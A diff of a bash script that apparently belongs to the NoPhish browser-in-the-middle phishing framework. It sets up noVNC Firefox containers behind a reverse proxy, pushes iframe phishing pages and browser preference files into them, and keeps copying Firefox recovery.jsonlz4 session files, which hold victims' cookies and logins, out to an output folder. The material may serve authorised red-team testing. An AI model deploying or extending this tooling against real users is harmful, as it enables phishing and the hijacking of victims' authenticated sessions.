@@ -362,7 +362,7 @@ case "$1" in
 		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/muser.js
        			echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js
 		    	sudo docker cp ./vnc/muser.js mvnc-user$c:/home/headless/user.js
-		    	sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "
+		    	sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; -exec sh -c 'cp -f /home/headless/user.js {}' \;"
 		else
 		    	echo 'user_pref("general.useragent.override","'$useragent'");' > ./vnc/user.js
 		    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
@@ -371,7 +371,7 @@ case "$1" in
 		    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
 		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
 		    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
-		    	sudo docker exec vnc-user$c /bin/bash -c 'find -name prefs.js -exec dirname {} \; | xargs cp /home/headless/user.js '
+		    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; -exec sh -c 'cp -f /home/headless/user.js {}' \;"
  		fi
 
 	    else
@@ -385,7 +385,7 @@ case "$1" in
 		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/muser.js
 		    	echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js
 		    	sudo docker cp ./vnc/muser.js mvnc-user$c:/home/headless/user.js
-		    	sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "
+		    	sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; -exec sh -c 'cp -f /home/headless/user.js {}' \;"
 	    	else    	
 			echo 'user_pref("general.useragent.override","This user was phished by NoPhish");' > ./vnc/user.js
 		    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
@@ -394,7 +394,7 @@ case "$1" in
 		    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
 		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
 		    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
-		    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "
+		    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; -exec sh -c 'cp -f /home/headless/user.js {}' \;"
 	    	fi	   	  
 	    fi
 	    
@@ -722,8 +722,13 @@ case "$1" in
 	END=$((END / 2))
 	for (( d=$START; d<=$END; d++ ))
 	do
-		sudo docker cp ./proxy/iframe$d.html rev-proxy:/var/www/html/
-		sudo docker cp ./proxy/miframe$d.html rev-proxy:/var/www/html/
+	    if [ -f "./proxy/iframe$d.html" ]; then
+		sudo docker cp "./proxy/iframe$d.html" rev-proxy:/var/www/html/
+	    fi
+	    
+	    if [ -f "./proxy/miframe$d.html" ]; then
+		sudo docker cp "./proxy/miframe$d.html" rev-proxy:/var/www/html/
+	    fi
 	done
 	sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
 	
@@ -769,7 +774,7 @@ case "$1" in
 	
 	while :
 	do
-	for (( c=$START; c<=$END; c++ ))
+	for (( c=$START; c<=$END; c+=2 ))
 	do
            pushd ./output &> /dev/null
            sudo docker exec vnc-user$c sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
